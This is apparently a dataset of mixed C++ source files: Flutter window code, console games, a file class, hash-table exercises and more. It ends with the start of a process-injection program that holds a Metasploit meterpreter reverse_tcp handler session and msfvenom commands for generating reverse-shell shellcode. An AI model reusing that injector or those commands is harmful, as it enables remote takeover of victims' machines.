FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <transform.h>\n#include <visit.h>\n\nstd::string Generate114::Transform(long long num, bool debug)\n{\n    // init\n    std::string out;\n    std::string result = \"\";\n    short flag = 0;\n    long long temp = num, count = 0;\n\n    // deal with negative numbers\n    if (num < 0)\n        goto NEGATIVE_NUMBER_SOLUTION;\n\n    // visit in table\n    out = Generate114::Visit(num);\n\n    // check and recreate result\n    if (out != \"\")\n    {\n        return out;\n    }\n    else\n    {\n    // deal with negative numbers\n    NEGATIVE_NUMBER_SOLUTION:\n        if (num < 0)\n        {\n            num = -num;\n            result = \"(\" + Generate114::Visit(-1) + \") * (\";\n            out = Generate114::Visit(num);\n            if (out == \"\")\n            {\n                flag = 1;\n                goto RECREATE_RESULT;\n            }\n            result += out + \")\";\n            return result;\n        }\n\n    RECREATE_RESULT:;\n        std::string out2;\n        std::string out3;\n\n        // 1. 0 <= num <= 10000(1e4)\n        if (num <= 10000)\n        {\n        FIRST_FORM_SOLUTION:\n            // form: a + b\n            for (int a = num / 2; a < num; a++)\n            {\n                out = Generate114::Visit(a);\n                out2 = Generate114::Visit(num - a);\n                if (out != \"\" && out2 != \"\")\n                {\n                    result = out + \" + \" + out2;\n                    goto NEGATIVE_CHECK;\n                }\n            }\n\n            return \"\";\n        }\n\n        // 2. 10000(1e4) <= num <= 114514\n        else if (num <= 114514)\n        {\n        SECOND_FORM_SOLUTION:\n            // form: a * b + c\n            for (int a = 0; a < (int)sqrt(num) + 1; a++)\n            {\n                if (a == 0)\n                    continue;\n                out = Generate114::Visit(a);\n                out2 = Generate114::Visit((long long)num / a);\n                out3 = Generate114::Visit(num % a);\n                if (out != \"\" && out2 != \"\" && out3 != \"\")\n                {\n                    if ((int)num / a != 1)\n                        result += \"(\" + out + \") * (\" + out2 + \")\";\n                    else\n                        result += out;\n                    if (num % a != 0)\n                        result += \" + \" + out3;\n\n                    goto NEGATIVE_CHECK;\n                }\n            }\n\n            return \"\";\n        }\n\n        // 3. 114514 <= num <= 13113456196\n        else if (num <= 13113456196)\n        {\n        THIRD_FORM_SOLUTION:\n            // form:114514 * a + b * c + d\n            std::string out1 = Generate114::Visit((long long)num / 114514);\n            std::string out2 = Generate114::Visit(114514);\n            result = \"( \" + out1 + \") * (\" + out2 + \") + \";\n            int last = num % 114514;\n            if (0 <= last && last <= 10000)\n                goto FIRST_FORM_SOLUTION;\n            else\n                goto SECOND_FORM_SOLUTION;\n        }\n\n        // 4. num > 13113456196\n        else\n        {\n        FOURTH_FORM_SOLUTION:\n            // form: 114514 ^ a * b + c\n            while (temp < 114514)\n            {\n                temp /= 114514;\n                count++;\n            }\n\n            result = \"(\" + Generate114::Visit(114514) + \") ^ (\" + Generate114::Transform(count, debug) + \") * (\" + Generate114::Transform(num / (long long)powl(114514, count)) + \") + \" + Generate114::Transform(num % (long long)powl(114514, count));\n            goto NEGATIVE_CHECK;\n        }\n\n        NEGATIVE_CHECK:\n            if (flag == 1)\n                result += \"\";\n            return result;\n        }\n    }",
    "#include<iostream>\r\n#include<windows.h>\r\n#include<conio.h>\r\n#include <unordered_set>\r\nusing namespace std;\r\n\r\nint height = 25;\r\nint width = 90;\r\nint gameover = 0, counter;\r\nint lflag = 0, rflag = 0, uflag = 0, dflag = 0;\r\n\r\nclass Snake {\r\n    int x, y, fx, fy;\r\n\r\n    struct node {\r\n        int nx, ny;\r\n        struct node* next;\r\n        struct node* prev;\r\n    };\r\n\r\n    struct node* head = NULL;\r\n\r\npublic:\r\n\r\n    /* Manages the visibility of the cursor in the console.*/\r\n    void cursorvisibility(bool x) {\r\n        HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);\r\n        CONSOLE_CURSOR_INFO cursorInfo;\r\n        GetConsoleCursorInfo(out, &cursorInfo);\r\n        cursorInfo.bVisible = x;\r\n        SetConsoleCursorInfo(out, &cursorInfo);\r\n    }\r\n\r\n    /* Sets the console cursor position to the specified coordinates (x, y) using WinAPI's */\r\n    void gotoxy(int x, int y){\r\n        COORD pos = { x, y };\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);\r\n    }\r\n\r\n   /**[Screen Management] */\r\n\r\n    /*  Displays the game screen borders */\r\n    int setBorder(int w1,int w2,int h1,int h2){\r\n        // upper and lower wall\r\n        for (int i = w1; i <= w2; i++) {\r\n            gotoxy(i, h1);\r\n            cout << \"#\";\r\n            gotoxy(i, h2);\r\n            cout << \"#\";\r\n        }\r\n        // left and right wall\r\n        for (int i = h1; i <= h2; i++) {\r\n            gotoxy(w1, i);\r\n            cout << \"#\";\r\n            gotoxy(w2, i);\r\n            cout << \"#\";\r\n        }\r\n    }\r\n\r\n    /*  Displays the current score and ESC functionality */\r\n    void sideScreen(){\r\n        gotoxy(99, 9);\r\n        cout << \"WELCOME TO \";\r\n        gotoxy(95, 10);\r\n        cout <<\"*** SNAKE GAME ***\";\r\n        gotoxy(94, 11);\r\n        cout <<\"********************\";\r\n        gotoxy(99, 13);\r\n        cout <<\" SCORE = \" << counter * 10;\r\n        gotoxy(94, 20);\r\n        cout << \" ~ Press ESC to Pause\";\r\n    }\r\n\r\n\t/* Displays the game-over screen, the player's score */\r\n    int finalScreen(){\r\n        setBorder(width/4, width/4+width/2, height/4, height/4+height/2);\r\n\r\n        gotoxy( width/2 - 9, height/2 - 2 );\r\n        cout << \"*** GAME OVER ***\";\r\n        gotoxy( width/2 - 10, height/2 - 1 );\r\n        cout << \"*******************\";\r\n\r\n        gotoxy(width/2 - 9, height/2+2 );\r\n        cout << \" You Scored : \" << counter * 10;\r\n        cursorvisibility(false);\r\n\r\n        Sleep(15000); // Pause for 1.5 seconds before clearing the screen\r\n        system(\"cls\");\r\n    }\r\n\r\n\r\n   /**[Fruit and Snake Management] */\r\n\r\n    /* Create the Fruit */\r\n    void createFruit(){\r\n        gotoxy(fx, fy);\r\n        cout << \"@\";\r\n    }\r\n\r\n    /* Create the Snake */\r\n    void createSnake(struct node* head){\r\n        struct node* ptr = head;\r\n        int count = 0;\r\n        while (ptr != NULL) {\r\n            gotoxy(ptr->nx, ptr->ny);\r\n            if (count == 0) {\r\n                cout << \"O\"; // head\r\n            } else {\r\n                cout << \"o\"; // body\r\n            }\r\n            ptr = ptr->next;\r\n            count++;\r\n        }\r\n    }\r\n\r\n    /* Create the Snake's Body */\r\n\tvoid createBody(struct node* head, int x, int y){\r\n\t\tstruct node* ptr, * previous;\r\n\t\tptr = head;\r\n\t\tprevious = head;\r\n\r\n\t\twhile (ptr->next != NULL){\r\n\t\t\tprevious = ptr;\r\n\t\t\tptr = ptr->next;\r\n\t\t}\r\n\t\twhile (previous != head){\r\n\t\t\tptr->nx = previous->nx;\r\n\t\t\tptr->ny = previous->ny;\r\n\t\t\tprevious = previous->prev;\r\n\t\t\tptr = ptr->prev;\r\n\t\t}\r\n\t\tptr->nx = previous->nx;\r\n\t\tptr->ny = previous->ny;\r\n\t\tprevious->nx = x;\r\n\t\tprevious->ny = y;\r\n\t}\r\n\r\n    /* Remove the Snake from the Screen */\r\n    void removeSnake(struct node* head){\r\n        struct node* ptr = head;\r\n        while (ptr != NULL) {\r\n            gotoxy(ptr->nx, ptr->ny);\r\n            cout << \" \";\r\n            ptr = ptr->next;\r\n        }\r\n    }\r\n\r\n    /* Snake's Initial Position */\r\n    void setInitialPosition() {\r\n        head = new node;\r\n        // Set the initial coordinates for the snake head at the center of the game grid.\r\n        head->nx = width / 2;\r\n        head->ny = height / 2;\r\n\r\n        head->next = NULL;\r\n        head->prev = NULL;\r\n\r\n        // Set the x and y variables to the same values as the head's coordinates.\r\n        x = width / 2;\r\n        y = height / 2;\r\n    }\r\n\r\n    /* Illustrate the snake and the fruit */\r\n    void draw(){\r\n        createSnake(head);\r\n        createFruit();\r\n        cursorvisibility(false);\r\n        Sleep(70);\r\n\r\n        removeSnake(head);\r\n        cursorvisibility(true);\r\n    }\r\n\r\n   /**[Snake Movement] */\r\n\r\n    /* Resets the Movement flags to their default values.*/\r\n    void resetflag(){\r\n\t\tuflag = 0;\r\n\t\tdflag = 0;\r\n\t\tlflag = 0;\r\n\t\trflag = 0;\r\n\t}\r\n\r\n    /* Handles keyboard inputs for movement and game pause*/\r\n\tvoid snakeMove(){\r\n\t\tint h;\r\n\t\tchar ch;\r\n\t\t// If a key is pressed\r\n\t\tif (_kbhit()){\r\n\t\t\tch = _getch();   // Store the pressed key\r\n\t\t\th = ch;         // store the ascii code of the pressed key\r\n            switch (h){\r\n                case 72:\r\n                 ",
    "//\n//  File.cpp\n//  NrIO\n//\n//  Created by Nyhl Rawlings on 15/01/2020.\n//  Copyright \u00a9 2020 Liquidsoft Studio. All rights reserved.\n//\n\n#include \"File.h\"\n\nnamespace nrcore {\n\n    File::File(const char *path) : Memory(FILE_BUFFER_SIZE), fill(0), offset(0), update_file(false)  {\n        this->path = path;\n        \n        fp = fopen(path, \"r+\");\n        if (!fp) {\n            fp = fopen(path, \"w+\");\n            if (!fp)\n                throw \"Failed to open\";\n        }\n        \n        updateFileSize();\n        \n        fill = fread(buffer.getPtr(), 1, FILE_BUFFER_SIZE, fp);\n    }\n    \n    File::~File() {\n        if (update_file)\n            updateFile();\n        \n        if (fp)\n            fclose(fp);\n    }\n    \n    char& File::operator [](size_t index) {\n        if (index>=sz)\n            throw \"Index Out Of Range\";\n        \n        if (fill && index >= offset && index < offset+fill)\n            return Memory::operator [](index-offset);\n        \n        if (fill && update_file)\n            updateFile();\n        \n        offset = index-(index%FILE_BUFFER_SIZE);\n        fseek(fp, offset, SEEK_SET);\n        fill = fread(buffer.getPtr(), 1, FILE_BUFFER_SIZE, fp);\n        return Memory::operator [](index-offset);\n    }\n    \n    \n    Memory File::getMemory() const {\n        char *buf = new char[sz];\n        fseek(fp, 0L, SEEK_SET);\n        size_t len = fread(buf, 1, sz, fp);\n        \n        Memory mem(buf, len);\n        \n        delete[] buf;\n        \n        return mem;\n    }\n    \n    Memory File::getSubBytes(size_t offset, size_t length) const {\n        char *buf = new char[length];\n        fseek(fp, offset, SEEK_SET);\n        length = fread(buf, 1, length, fp);\n        \n        Memory mem(buf, length);\n        \n        delete[] buf;\n        \n        return mem;\n    }\n    \n    void File::write(size_t offset, const char* data, size_t length) {\n        size_t len = 0;\n        if (update_file) {\n            if (offset < this->offset) { // copy preceeding bytes\n                len = (this->offset - offset > length) ? length : this->offset - offset;\n                writeToFile(offset, data, len);\n                offset += len;\n                data += len;\n                length -= len;\n            }\n            \n            if (length) {\n                if (offset >= this->offset && offset < this->offset+fill) {\n                    size_t coffset = this->offset - offset;\n                    len = (fill-coffset) < length ? fill-coffset : length;\n                    char *buf = &buffer.getPtr()[coffset];\n                    memcpy(buf, data, len);\n                    \n                    offset += len;\n                    data += len;\n                    length -= len;\n                }\n            }\n            \n            if (length) {\n                writeToFile(offset, data, length);\n                updateFileSize();\n            }\n            \n        } else {\n            writeToFile(offset, data, length);\n            updateFileSize();\n        }\n    }\n\n    Memory File::read(size_t offset, size_t length) const {\n        Memory buffer(length);\n        \n        fseek(fp, offset, SEEK_SET);\n        size_t fill = fread(buffer.getPtr(), 1, length, fp);\n        fseek(fp, this->offset, SEEK_SET);\n        \n        return Memory(buffer.operator char *(), fill);\n    }\n    \n    size_t File::length() const {\n        return sz;\n    }\n    \n    void File::setFileUpdating(bool val) {\n        update_file = val;\n    }\n    \n    void File::grow(size_t size) {\n        char byte = 0;\n        fseek(fp, 0, SEEK_END);\n        \n        sz += size;\n        \n        while(size--)\n            fwrite(&byte, 1, 1, fp);\n    }\n    \n    void File::truncate() {\n        if (fp) {\n            offset = 0;\n            fp = freopen(NULL, \"w+\", fp);\n        }\n    }\n    \n    int File::fileno() {\n        return ::fileno(fp);\n    }\n\n    void File::updateFileSize() {\n        fseek(fp, 0L, SEEK_END);\n        sz = ftell(fp);\n        fseek(fp, 0L, SEEK_SET);\n    }\n    \n    void File::updateFile(){\n        fseek(fp, offset, SEEK_SET);\n        size_t written = 0;\n        while(written < fill)\n            fwrite(&buffer.getPtr()[written], 1, fill, fp);\n        fflush(fp);\n    }\n    \n    void File::writeToFile(size_t offset, const char* data, size_t length) {\n        fseek(fp, offset, SEEK_SET);\n        size_t written = 0;\n        while(written < length)\n            written += fwrite(&data[written], 1, length, fp);\n        fflush(fp);\n    }\n\n}\n",
    "#include <iostream>\n#include<Windows.h>\n#include<time.h>\n#include<conio.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nusing namespace std;\nbool gameOver;\nconst int width = 60, hight = 30;//\u00e7\u00ec\u00b3\u00ed\u00ed\u00b3 \u00e4\u00eb\u00ff \u00b3\u00e3\u00f0\u00ee\u00e2\u00ee\u00e3\u00ee \u00ef\u00ee\u00eb\u00ff\nint x, y, score;\nenum eDirection { STOP = 0, LEFT, RIGHT, UP, DOWN, EXITT };\neDirection dir;\nchar arr[hight][width] = {};\nbool exit_t = false;\n\nint coin_1_x = 4;\nint coin_1_y = 7;\nbool coin_1 = true;\n\nint coin_2_x = 56;\nint coin_2_y = 3;\nbool coin_2 = true;\n\n\n\nint coin_3_x = 8;\nint coin_3_y = 24;\nbool coin_3 = true;\n\nint coin_4_x = 50;\nint coin_4_y = 27;\nbool coin_4 = true;\n\nint exit_1_y = 29;\nint exit_1_x = 57;\n\nint exit_2_y = 29;\nint exit_2_x = 58;\n\nint exit_3_y = 29;\nint exit_3_x = 56;\n\nint exit_4_y = 29;\nint exit_4_x = 55;\n\nvoid Setup() {\n    gameOver = false;\n    x = 1;\n    y = 1;\n    score = 0;\n\n    coin_1 = true;\n\n}\nvoid Draw() {\n    for (int i = 0; i < hight; i++) {\n        for (int j = 0; j < width; j++) {\n            if (i == 3 && j == 1 ||\n                i == 3 && j == 2 ||\n                i == 3 && j == 3 ||\n                i == 3 && j == 4 ||\n                i == 3 && j == 5 ||\n                i == 3 && j == 6 ||\n                i == 3 && j == 7 ||\n                i == 3 && j == 8 ||\n                i == 3 && j == 9 ||\n                i == 3 && j == 10 ||\n                i == 3 && j == 11 ||\n                i == 3 && j == 12 ||\n                i == 3 && j == 13 ||\n                i == 3 && j == 14 ||\n                i == 3 && j == 15 ||\n                i == 3 && j == 16 ||\n\n                i == 5 && j == 1 ||\n                i == 5 && j == 2 ||\n                i == 5 && j == 3 ||\n                i == 5 && j == 4 ||\n                i == 5 && j == 5 ||\n                i == 5 && j == 6 ||\n                i == 5 && j == 7 ||\n                i == 5 && j == 8 ||\n                i == 5 && j == 9 ||\n\n\n                i == 6 && j == 9 ||\n                i == 7 && j == 9 ||\n                i == 8 && j == 9 ||\n\n                i == 8 && j == 9 ||\n                i == 8 && j == 10 ||\n                i == 8 && j == 11 ||\n                i == 8 && j == 12 ||\n                i == 8 && j == 13 ||\n                i == 8 && j == 14 ||\n                i == 8 && j == 15 ||\n                i == 8 && j == 16 ||\n                i == 8 && j == 17 ||\n                i == 8 && j == 18 ||\n                i == 8 && j == 19 ||\n                i == 8 && j == 20 ||\n                i == 8 && j == 21 ||\n\n\n\n                i == 1 && j == 21 ||\n                i == 2 && j == 21 ||\n                i == 3 && j == 21 ||\n                i == 4 && j == 21 ||\n                i == 5 && j == 21 ||\n                i == 6 && j == 21 ||\n\n                i == 1 && j == 30 ||\n                i == 2 && j == 30 ||\n                i == 3 && j == 30 ||\n                i == 4 && j == 30 ||\n                i == 5 && j == 30 ||\n                i == 6 && j == 30 ||\n\n\n                i == 6 && j == 22 ||\n                i == 6 && j == 23 ||\n                i == 6 && j == 24 ||\n                i == 6 && j == 25 ||\n                i == 6 && j == 26 ||\n                i == 6 && j == 27 ||\n                i == 6 && j == 28 ||\n                i == 6 && j == 29 ||\n\n                i == 7 && j == 26 ||\n                i == 8 && j == 26 ||\n                i == 9 && j == 26 ||\n                i == 10 && j == 26 ||\n                i == 11 && j == 26 ||\n                i == 12 && j == 26 ||\n                i == 13 && j == 26 ||\n\n\n                i == 4 && j == 16 ||\n                i == 5 && j == 16 ||\n                i == 6 && j == 16 ||\n                i == 7 && j == 16 ||\n\n                i == 13 && j == 26 ||\n                i == 13 && j == 27 ||\n                i == 13 && j == 28 ||\n                i == 13 && j == 29 ||\n                i == 13 && j == 30 ||\n\n\n                i == 11 && j == 30 ||\n                i == 12 && j == 30 ||\n\n\n                i == 11 && j == 31 ||\n                i == 11 && j == 32 ||\n                i == 11 && j == 33 ||\n                i == 11 && j == 34 ||\n                i == 11 && j == 35 ||\n                i == 11 && j == 36 ||\n                i == 11 && j == 37 ||\n                i == 11 && j == 38 ||\n                i == 11 && j == 39 ||\n                i == 11 && j == 40 ||\n                i == 11 && j == 41 ||\n                i == 11 && j == 42 ||\n                i == 11 && j == 43 ||\n                i == 11 && j == 44 ||\n                i == 11 && j == 45 ||\n                i == 11 && j == 46 ||\n\n                i == 9 && j == 46 ||\n                i == 10 && j == 46 ||\n\n                i == 9 && j == 45 ||\n                i == 9 && j == 44 ||\n                i == 9 && j == 43 ||\n                i == 9 && j == 42 ||\n\n                i == 4 && j == 42 ||\n                i == 5 && j == 42 ||\n                i == 6 && j == 42 ||\n                i == 7 && j == 42 ||\n                i == 8 && j == 42 ||\n\n                i == 4 && j == 38 ||\n                i == 4 && j == 39 ||\n                i == 4 &",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n#define MAX 10\r\n\r\nstruct node {\r\n    int id;\r\n    string name, history, disease, t_plan[MAX];\r\n};\r\n\r\nclass HashTable {\r\n    node p[MAX];\r\n\r\npublic:\r\n    HashTable() {\r\n      \r\n        for (int i = 0; i < MAX; i++) {\r\n            p[i].id = -1;\r\n        }\r\n    }\r\n\r\n    void insert();\r\n    void search(int id);\r\n    void deleter(int id);\r\n    void display();\r\n};\r\n\r\nvoid HashTable::insert() {\r\n    node newPatient;\r\n    cout<<\"Max 10 records can be inserted \\n\";\r\n\r\n    cout << \"Enter the patient id: \";\r\n    cin >> newPatient.id;\r\n\r\n    cout << \"Enter the Patient Name: \";\r\n    cin >> newPatient.name;\r\n\r\n    cout << \"Enter the medical history of patient: \";\r\n    cin >> newPatient.history;\r\n\r\n    cout << \"Enter the disease of the patient: \";\r\n    cin >> newPatient.disease;\r\n\r\n    cout << \"Enter the treatment plan for the patient: \";\r\n    cin >> newPatient.t_plan[0]; \r\n\r\n    int b = newPatient.id % MAX;\r\n\r\n    while (p[b].id != -1) {\r\n        cout << \"Collision occurred at position \" << b << \". \";\r\n        b = (b + 1) % MAX; \r\n    }\r\n\r\n    p[b] = newPatient; \r\n    cout << \"Patient \" << newPatient.name << \" inserted at position \" << b << \".\" << endl;\r\n}\r\n\r\nvoid HashTable::search(int id) {\r\n    int b = id % MAX;\r\n    int initial_b = b;\r\n\r\n\r\n    while (p[b].id != id && p[b].id != -1) {\r\n        b = (b + 1) % MAX;\r\n\r\n        if (b == initial_b) {\r\n            cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n            return;\r\n        }\r\n    }\r\n\r\n    if (p[b].id == id) {\r\n        cout << \"Patient found at position \" << b << \":\" << endl;\r\n        cout << \"ID: \" << p[b].id << endl;\r\n        cout << \"Name: \" << p[b].name << endl;\r\n        cout << \"Disease: \" << p[b].disease << endl;\r\n        cout << \"History: \" << p[b].history << endl;\r\n        cout << \"Treatment Plan: \" << p[b].t_plan[0] << endl;\r\n    } else {\r\n        cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n    }\r\n}\r\n\r\nvoid HashTable::deleter(int id) {\r\n    int b = id % MAX;\r\n    int initial_b = b;\r\n\r\n    while (p[b].id != id && p[b].id != -1) {\r\n        b = (b + 1) % MAX;\r\n       \r\n        if (b == initial_b) {\r\n            cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n            return;\r\n        }\r\n    }\r\n\r\n    if (p[b].id == id) {\r\n        p[b].id = -1; \r\n        cout << \"Patient with ID \" << id << \" deleted successfully.\" << endl;\r\n    } else {\r\n        cout << \"Patient with ID \" << id << \" not found.\" << endl;\r\n    }\r\n}\r\n\r\nvoid HashTable::display() {\r\n    cout << \"\\nPatients in the Hash Table:\" << endl;\r\n    cout << \"Index\\tID\\tName\\tDisease\\tHistory\\tTreatment Plan\" << endl;\r\n    for (int i = 0; i < MAX; i++) {\r\n        if (p[i].id != -1) {\r\n            cout << i << \"\\t\" << p[i].id << \"\\t\" << p[i].name << \"\\t\" << p[i].disease << \"\\t\" << p[i].history << \"\\t\" << p[i].t_plan[0] << endl;\r\n        } else {\r\n            cout << i << \"\\tEMPTY\" << endl; \r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    HashTable h;\r\n    int choice, id;\r\n\r\n    do {\r\n        cout << \"\\n1. Insert a Patient\" << endl;\r\n        cout << \"2. Search for a Patient\" << endl;\r\n        cout << \"3. Delete a Patient\" << endl;\r\n        cout << \"4. Display all Patients\" << endl;\r\n        cout << \"5. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                h.insert();\r\n                break;\r\n            case 2:\r\n                cout << \"Enter the ID of the patient you want to search: \";\r\n                cin >> id;\r\n                h.search(id);\r\n                break;\r\n            case 3:\r\n                cout << \"Enter the ID of the patient you want to delete: \";\r\n                cin >> id;\r\n                h.deleter(id);\r\n                break;\r\n            case 4:\r\n                h.display();\r\n                break;\r\n            case 5:\r\n                cout << \"Exiting...\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "// You must complete the TODO parts and then complete LinkedList.cpp. Delete \"TODO\" after you are done.\n//\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <cassert>\n#include \"htable.h\"\n#include <stdlib.h>\n\nusing namespace std;\n\n//PURPOSE of the Program: to test hashing to a doubly linked list with FIFO ordering.\nint main() {\n\tcout << \"\\tTesting the Hash table of customer orders \" << endl;\n\tHashTable table;\n\tcout << \"Number of Hashtable buckets: \" << table.numBuckets() << endl;\n\tcout << \"The initial # of orders: \" << table.numOrders() << endl << endl;\n\n\tcout << \"Reading orders from file orders.txt\" << endl;\n\ttable.fillTable(\"orders.txt\");\n\tcout << \"The # of orders: \" << table.numOrders() << endl << endl;\n\n\t// Read the orders in the \"orders.txt\" file\n\tOrder order;\n\tvector<Order> orders;\n\tifstream fin;\n\tfin.open(\"orders.txt\");\n\tif (!fin.good()) throw \"I/O error\";\n\twhile (fin >> order) {\n\t\torders.push_back(order);//send each order into the orders vector\n\t}\n\n\tcout << \"\\nAll orders should be in the hash table\\n\";\n\tfor (Order order : orders) {\n\t\tassert(table.findOrder(order.id, order));\n\t}\n\n\t// Create a vector of orders not in the hash table\n\tvector<Order> new_orders(10);\n\tnew_orders[0] = Order(0, \"Michael\", 10);\n\tnew_orders[1] = Order(1, \"Christopher\", 20);\n\tnew_orders[2] = Order(2, \"Jessica\", 30);\n\tnew_orders[3] = Order(3, \"Matthew\", 40);\n\tnew_orders[4] = Order(4, \"Ashley\", 50);\n\tnew_orders[5] = Order(5, \"Jennifer\", 60);\n\tnew_orders[6] = Order(6, \"Joshua\", 70);\n\tnew_orders[7] = Order(7, \"Amanda\", 80);\n\tnew_orders[8] = Order(8, \"Daniel\", 90);\n\tnew_orders[9] = Order(9, \"David\", 100);\n\tcout << \"\\nThese orders should not be in the hash table\\n\";\n\tfor (Order order : new_orders) {\n\t\tassert(!table.findOrder(order.id, order));\n\t}\n\n\tcout << \"\\nInsert the new orders into the hash table\\n\";\n\tfor (Order order : new_orders) {\n\t\tassert (table.insertOrder(order));\n\t}\n\t\n\tcout << \"\\nAll orders should be in the hash table now\\n\";\n\tfor (Order order : new_orders) {\n\t\tassert (table.findOrder(order.id, order));\n\t}\n\n\t// Update the orders in the hash table\n\tcout << \"\\nUpdating the orders in the hash table\\n\";\n\tfor (Order order : new_orders) {\n\t\t//Cannot insert because the order ID already exists\n\t\tassert (!table.insertOrder(order));\n\t\t//Update the order\n\t\tassert (table.findOrder(order.id, order));\n\t\tcout << \"\\nBefore update: \" << order << \"\\t\";\n\t\torder.amount = 150;\n\t\tassert (table.updateOrder(order));\n\t\t// Find the updated order\n\t\tassert (table.findOrder(order.id, order));\n\t\tcout << \"\\nAfter update: \" << order << endl;\n\t}\n\t// Remove the new orders from the hash table\n\tfor (Order order : new_orders) {\n\t\tassert (table.removeOrder(order.id));\n\t}\n\n\t// Test the rehashing\n\tcout << \"\\nRehashing the hash table\\n\";\n\ttable.rehash(47);\n\ttable.printTable();\n\tcout << \"Number of Hashtable buckets: \" << table.numBuckets() << endl;\n\tcout << \"The # of Orders: \" << table.numOrders() << endl;\n\n\tcout << \"\\nAll orders should be in the hash table\\n\";\n\tfor (Order order : orders) {\n\t\t//cout << order << endl;\n\t\tassert (table.findOrder(order.id, order)); \n\t}\n\tcout << \"\\nThese orders should not be in the hash table\\n\";\n\tfor (Order order : new_orders) {\n\t\tassert (!table.findOrder(order.id, order));\n\t}\n\t\n}\n\n\n",
    "// ProcessInjection_01.cpp : This file contains the 'main' function. Program execution begins and ends there.// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY \n// VIRTUALPROTECT -> API TO CHANGE PERMISSIONS IN MEMORY \n\n#include <iostream>\n#include <windows.h>\n#include <stdio.h> \nmsf6 exploit(multi/handler) > run -j\n\n[-] Msf::OptionValidateError One or more options failed to validate: LHOST.\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/handler) > set lhost wlan1\nlhost => wlan1\nmsf6 exploit(multi/handler) > let lport 443\n[-] Unknown command: let. Did you mean set? Run the help command for more details.\nmsf6 exploit(multi/handler) > set lport 443\nlport => 443\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > run -j\n\n\n\n//* to compile reverse shell, use msfvenom \n//... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke\n//  msfvenom --platform windows -a x86 -p payload/windows/custom/reverse_named_pipe LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke003\n/* Init*/\nDWORD PID = NULL;  // process id \nHANDLE hProcess = NULL; // process \nLPVOID rBuffer = NULL; //  data to inject into thread  (buffer)  \nHANDLE hThread = NULL;  // handle thread to write memory \nDWORD TID = NULL; // thread ID\n\n//payload\n//[X64 ARCHITECTURE]\nunsigned char crowPuke[] = 